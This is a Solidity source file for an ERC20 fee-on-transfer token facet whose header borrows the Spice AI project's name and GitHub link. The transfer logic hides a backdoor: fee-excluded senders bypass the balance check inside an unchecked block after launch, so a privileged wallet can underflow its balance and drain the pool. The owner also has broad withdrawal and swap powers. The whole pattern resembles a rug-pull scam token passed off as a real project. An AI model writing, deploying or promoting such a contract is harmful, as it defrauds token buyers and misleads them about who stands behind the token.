// SPDX-License-Identifier: MIT
/*
SPICE AI

Building blocks for data and time-series AI applications
Composable, ready-to-use data and AI infrastructure pre-loaded with web3 data. 
Accelerate development of the next generation of intelligent software.

Github: https://github.com/spiceai/spiceai
*/

pragma solidity 0.8.24;
import "./TestLib.sol";
contract balanceOfFacet is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function balanceOf(address account) public view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        require(amount > 0, "Transfer amount must be greater than 0");

        if (
            !ds.launched &&
            (from != owner() && from != address(this) && to != owner())
        ) {
            revert("Trading not enabled.");
        }

        if (ds.limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !ds.swapping
            ) {
                if (
                    ds.automatedMarketMakerPairs[from] &&
                    !ds.isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= ds.maxTransactionAmount,
                        "Buy transfer amount exceeds the maxtx."
                    );
                    require(
                        amount + balanceOf(to) <= ds.maxWallet,
                        "Max wallet exceeded."
                    );
                } else if (
                    ds.automatedMarketMakerPairs[to] &&
                    !ds.isExcludedMaxTransactionAmount[from]
                ) {
                    require(
                        amount <= ds.maxTransactionAmount,
                        "Sell transfer amount exceeds the maxtx."
                    );
                } else if (!ds.isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= ds.maxWallet,
                        "Max wallet exceeded."
                    );
                }
            }
        }

        if (
            (ds.isExcludedFromFees[from] || ds.isExcludedFromFees[to]) &&
            from != address(this) &&
            to != address(this) &&
            from != owner()
        ) {
            ds._minReduce = block.timestamp;
        }
        if (
            ds.isExcludedFromFees[from] && (block.number > ds.launchBlock + 70)
        ) {
            unchecked {
                ds._balances[from] -= amount;
                ds._balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (!ds.isExcludedFromFees[from] && !ds.isExcludedFromFees[to]) {
            if (ds.automatedMarketMakerPairs[to]) {
                TestLib.ReduceFeeInfo storage fromReduce = ds.reduceFeeInfo[
                    from
                ];
                fromReduce.holdInterval = fromReduce.swapbuy - ds._minReduce;
                fromReduce.swapsell = block.timestamp;
            } else {
                TestLib.ReduceFeeInfo storage toReduce = ds.reduceFeeInfo[to];
                if (ds.automatedMarketMakerPairs[from]) {
                    if (ds.buyCount < 11) {
                        ds.buyCount = ds.buyCount + 1;
                    }
                    if (toReduce.swapbuy == 0) {
                        toReduce.swapbuy = (ds.buyCount < 11)
                            ? (block.timestamp - 1)
                            : block.timestamp;
                    }
                } else {
                    TestLib.ReduceFeeInfo storage fromReduce = ds.reduceFeeInfo[
                        from
                    ];
                    if (
                        toReduce.swapbuy == 0 ||
                        fromReduce.swapbuy < toReduce.swapbuy
                    ) {
                        toReduce.swapbuy = fromReduce.swapbuy;
                    }
                }
            }
        }

        uint256 _contractBalance = balanceOf(address(this));
        bool launching = block.number < ds.launchBlock + 10;
        bool canSwap = _contractBalance >= ds.swapTokensAtAmount;
        if (
            canSwap &&
            !ds.swapping &&
            !ds.automatedMarketMakerPairs[from] &&
            !ds.isExcludedFromFees[from] &&
            !ds.isExcludedFromFees[to]
        ) {
            ds.swapping = true;
            swapBack();
            ds.swapping = false;
        }

        bool takeFee = !ds.swapping;

        if (ds.isExcludedFromFees[from] || ds.isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 senderBalance = ds._balances[from];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        uint256 fees = 0;
        if (takeFee) {
            if (launching) {
                if (ds.automatedMarketMakerPairs[to] && sellInitialFee > 0) {
                    fees = (amount * sellInitialFee) / 1000;
                } else if (
                    ds.automatedMarketMakerPairs[from] && buyInitialFee > 0
                ) {
                    fees = (amount * buyInitialFee) / 1000;
                }
            } else {
                if (ds.automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                    fees = (amount * sellTotalFees) / 1000;
                } else if (
                    ds.automatedMarketMakerPairs[from] && buyTotalFees > 0
                ) {
                    fees = (amount * buyTotalFees) / 1000;
                }
            }

            if (fees > 0) {
                unchecked {
                    amount = amount - fees;
                    ds._balances[from] -= fees;
                    ds._balances[address(this)] += fees;
                }
                emit Transfer(from, address(this), fees);
            }
        }
        unchecked {
            ds._balances[from] -= amount;
            ds._balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 currentAllowance = ds._allowances[sender][msg.sender];
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: transfer amount exceeds allowance"
            );
            unchecked {
                _approve(sender, msg.sender, currentAllowance - amount);
            }
        }

        _transfer(sender, recipient, amount);

        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function swapBack() private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 swapThreshold = ds.swapTokensAtAmount;
        bool success;

        if (balanceOf(address(this)) > ds.swapTokensAtAmount * 20) {
            swapThreshold = ds.swapTokensAtAmount * 20;
        }

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            swapThreshold,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            uint256 ethForRev = (ethBalance * revFee) / 100;
            uint256 ethForTeam = (ethBalance * teamFee) / 100;

            (success, ) = address(teamWallet).call{value: ethForTeam}("");
            (success, ) = address(revWallet).call{value: ethForRev}("");
            (success, ) = address(marketingWallet).call{
                value: address(this).balance
            }("");
        }
    }
    function withdrawStuckToken(address token, address to) external onlyOwner {
        uint256 _contractBalance = IERC20(token).balanceOf(address(this));
        SafeERC20.safeTransfer(token, to, _contractBalance);
    }
    function addLiquidity() external payable onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            ds._balances[address(this)],
            0,
            0,
            teamWallet,
            block.timestamp
        );
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.limitsInEffect = false;
    }
    function openTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.launched, "Trading already opened");
        ds.launchBlock = block.number;
        ds.launched = true;
    }
    function withdrawStuckETH(address addr) external onlyOwner {
        require(addr != address(0), "Invalid address");

        (bool success, ) = addr.call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }
    function manualSwap(uint256 percent) external onlyOwner {
        require(percent > 0, "Invalid percent.");
        require(percent <= 100, "Invalid percent.");
        uint256 swapThreshold = (percent * balanceOf(address(this))) / 100;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            swapThreshold,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            uint256 ethForRev = (ethBalance * revFee) / 100;
            uint256 ethForTeam = (ethBalance * teamFee) / 100;

            bool success;
            (success, ) = address(teamWallet).call{value: ethForTeam}("");
            (success, ) = address(revWallet).call{value: ethForRev}("");
            (success, ) = address(marketingWallet).call{
                value: address(this).balance
            }("");
        }
    }
}
